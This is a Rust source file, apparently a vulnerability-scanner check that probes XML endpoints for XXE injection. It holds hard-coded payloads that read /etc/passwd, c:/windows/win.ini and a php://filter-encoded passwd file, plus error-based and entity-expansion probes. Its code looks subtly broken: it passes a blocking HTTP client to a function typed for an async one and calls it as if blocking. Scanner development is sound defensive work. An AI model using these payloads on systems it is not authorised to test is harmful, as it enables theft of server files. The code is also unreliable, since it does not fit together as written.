//! XXE Basic Injection Detection Module
//! Detects XML External Entity injection using local file read and error-based payloads.

use crate::checks::CheckModule;
use crate::findings::Finding;
use std::collections::HashSet;

const XXE_PAYLOADS: &[&str] = &[
    // Classic file read
    r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>"#,
    // PHP wrapper
    r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&test;</root>"#,
    // Error-based XXE
    r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///nonexistent_file_12345"> %xxe;]><root/>"#,
    // Windows paths
    r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>"#,
    // Nested entities
    r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY a "A"><!ENTITY b "&a;&a;"><!ENTITY c "&b;&b;">]><root>&c;</root>"#,
];

const CONTENT_TYPES: &[&str] = &[
    "application/xml",
    "text/xml",
    "application/xhtml+xml",
    "application/svg+xml",
    "application/soap+xml",
];

pub struct XXEBasicCheck {
    enabled: bool,
    timeout_ms: u64,
}

impl XXEBasicCheck {
    pub fn new() -> Self {
        Self {
            enabled: true,
            timeout_ms: 8000,
        }
    }

    fn probe_xxe(&self, url: &str, client: &reqwest::Client, payload: &str, content_type: &str) -> Option<XXEResult> {
        let resp = client
            .post(url)
            .header("Content-Type", content_type)
            .body(payload.to_string())
            .send()
            .ok()?;

        let status = resp.status().as_u16();
        let body = resp.text().ok()?;

        // Check for file content leakage
        let has_passwd = body.contains("root:") || body.contains("/bin/bash") || body.contains("nologin");
        let has_win_ini = body.contains("[extensions]") || body.contains("; for 16-bit app support");
        let has_error = body.contains("No such file") || body.contains("does not exist") || 
                        body.contains("XML parser") || body.contains("DOCTYPE");
        
        // Check for entity expansion (billion laughs style response patterns)
        let has_expansion = body.contains("AAAAAAAA") || body.chars().take(100).filter(|c| *c == 'A').count() > 10;

        if has_passwd || has_win_ini || has_expansion {
            Some(XXEResult {
                url: url.to_string(),
                payload_type: "file_read".to_string(),
                status_code: status,
                evidence: body.chars().take(500).collect::<String>(),
                severity: "critical",
            })
        } else if has_error && status >= 500 {
            Some(XXEResult {
                url: url.to_string(),
                payload_type: "error_based".to_string(),
                status_code: status,
                evidence: body.chars().take(300).collect::<String>(),
                severity: "high",
            })
        } else {
            None
        }
    }
}

#[derive(Debug)]
struct XXEResult {
    url: String,
    payload_type: String,
    status_code: u16,
    evidence: String,
    severity: &'static str,
}

impl CheckModule for XXEBasicCheck {
    fn name(&self) -> &'static str {
        "xxe_basic"
    }

    fn description(&self) -> &'static str {
        "Detects XML External Entity injection using local file read and error-based payloads"
    }

    fn severity(&self) -> crate::checks::Severity {
        crate::checks::Severity::Critical
    }

    fn run(&self, target: &crate::target::Target, context: &crate::context::ScanContext) -> Vec<Finding> {
        let mut findings = Vec::new();
        
        if !self.enabled {
            return findings;
        }

        let xml_endpoints = context.xml_endpoints();
        let client = reqwest::blocking::Client::builder()
            .timeout(std::time::Duration::from_millis(self.timeout_ms))
            .redirect(reqwest::redirect::Policy::none())
            .build()
            .unwrap_or_default();

        let mut triggered_payloads: HashSet<String> = HashSet::new();

        for endpoint in xml_endpoints {
            for content_type in CONTENT_TYPES {
                for payload in XXE_PAYLOADS {
                    let payload_key = format!("{}:{}", endpoint, payload.chars().take(20).collect::<String>());
                    
                    if triggered_payloads.contains(&payload_key) {
                        continue;
                    }

                    if let Some(result) = self.probe_xxe(&endpoint, &client, payload, content_type) {
                        triggered_payloads.insert(payload_key);
                        
                        let sev = match result.severity {
                            "critical" => crate::checks::Severity::Critical,
                            "high" => crate::checks::Severity::High,
                            _ => crate::checks::Severity::Medium,
                        };

                        let evidence = crate::findings::Evidence::new()
                            .with_detail("endpoint", result.url.clone())
                            .with_detail("payload_type", result.payload_type.clone())
                            .with_detail("content_type", content_type.to_string())
                            .with_raw_response(result.evidence.clone());

                        findings.push(Finding::new(self.name())
                            .with_target(result.url)
                            .with_severity(sev)
                            .with_title("XXE Injection Detected")
                            .with_description(format!("XML External Entity injection via {} payload", result.payload_type))
                            .with_evidence(evidence)
                            .with_confidence(0.90));
                        
                        break; // One finding per endpoint
                    }
                }
                
                if !triggered_payloads.is_empty() && triggered_payloads.iter().any(|k| k.contains(&endpoint)) {
                    break;
                }
            }
        }

        findings
    }

    fn clone_box(&self) -> Box<dyn CheckModule> {
        Box::new(self.clone())
    }
}

impl Clone for XXEBasicCheck {
    fn clone(&self) -> Self {
        Self {
            enabled: self.enabled,
            timeout_ms: self.timeout_ms,
        }
    }
}
